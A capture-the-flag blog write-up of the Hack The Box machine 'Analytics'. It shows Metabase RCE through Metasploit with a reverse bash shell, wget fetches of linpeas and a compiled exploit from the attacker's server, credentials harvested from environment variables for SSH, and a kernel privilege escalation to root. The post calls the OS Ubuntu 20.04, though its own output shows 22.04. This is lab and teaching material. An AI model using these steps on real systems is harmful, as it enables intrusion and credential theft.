---
author: pl4int3xt
layout: post
title: Analytics
date: '2023-11-07'
useRelativeCover: true
description: "Analytics is an easy linux machine from HTB"
categories: [Hack The Box]
---

## Machine Info

> **[Analytics](https://app.hackthebox.com/machines/Analytics)** is an easy linux machine which leverages `Metabse RCE` and `Ubuntu OverLaysFs Local privesc`

## ENUMERATION
We perform a simple scan for top 100 ports

```bash
nmap -sV -sC -top-ports 100 10.10.11.233
```

output

```bash
Nmap scan report for analytical.htb (10.10.11.233)
Host is up (0.88s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Analytical
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.83 seconds
```

Since we have port 80(HTTP) open we add the ip to our hosts file 

```bash
echo '10.10.11.233 analytical.htb' | sudo tee -a /etc/hosts
```

After opening the browser we click the login button and we are directed to another subdomain. We proceed again and add it to the hosts list

![img-description](1.png)

```bash
echo '10.10.11.233 data.analytical.htb' | sudo tee -a /etc/hosts
```

We get a metabase login page. We google for any available exploits for the service.

![img-description](2.png)

After some google searching i came across this [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

We proceed to msfconsole since the exploit is available
```bash
msf6 > search metabase

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/metabase_setup_token_rce) > 
```

Use show options command to see the options required and set them

```bash
msf6 exploit(linux/http/metabase_setup_token_rce) > set RHOST data.analytical.htb
RHOST => data.analytical.htb
msf6 exploit(linux/http/metabase_setup_token_rce) > set RPORT 80
RPORT => 80
msf6 exploit(linux/http/metabase_setup_token_rce) > set LHOST tun0
LHOST => 10.10.16.54
```
Lets run the exploit and boom "WE ARE IN"

```bash
msf6 exploit(linux/http/metabase_setup_token_rce) > run

[*] Started reverse TCP handler on 10.10.16.54:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version Detected: 0.46.6
[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[*] Sending exploit (may take a few seconds)
[*] Command shell session 1 opened (10.10.16.54:4444 -> 10.10.11.233:52878) at 2023-11-07 08:14:43 +0300

id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
whoami
metabase
```

Next we need to get and run linpeas to see if we can get something misconfigured in the system. We start our python server to upload linpeas
```bash
sudo python -m http.server 80
```

```bash
cd /home/metabase
wget http://10.10.16.54/linpeas.sh
```

```bash
bash linpeas.sh
```

After running linpeas.sh we get META_USER and META_PASS in the environment variables

```bash
╔══════════╣ Environment
╚ Any private information inside environment variables?
SHELL=/bin/sh
MB_DB_PASS=
HISTSIZE=0
HOSTNAME=1786d82953d0
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/home/metabase
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
HISTFILE=/dev/null
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=7
MB_DB_USER=
```

We ssh into the machine with the credentials 
```bash
ssh metalytics@10.10.11.233
password: An4lytics_ds20223#
```

```bash
metalytics@analytics:~$ ls
1  m  tmp  u  user.txt  w
```
## PRIVILEGE ESCALATION

We check the os version and find it is Ubuntu 20.04 LTS which has a public [CVE-2021-3493](https://github.com/briskets/CVE-2021-3493?source=post_page-----bd3421cba76d--------------------------------)
```bash
metalytics@analytics:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

We download the exploit and compile it on our local machine
```bash
gcc exploit.c -o exploit
```

We start our server again and get the exploit
```bash
sudo python -m http.server 80
``` 

```bash
wget http://10.10.16.54/exploit
```

We change the permissions of the file and run it. We are now r00t

```bash
metalytics@analytics:~$ chmod +x exploit
metalytics@analytics:~$ ./exploit
bash-5.1#
```

![img-description](3.png)
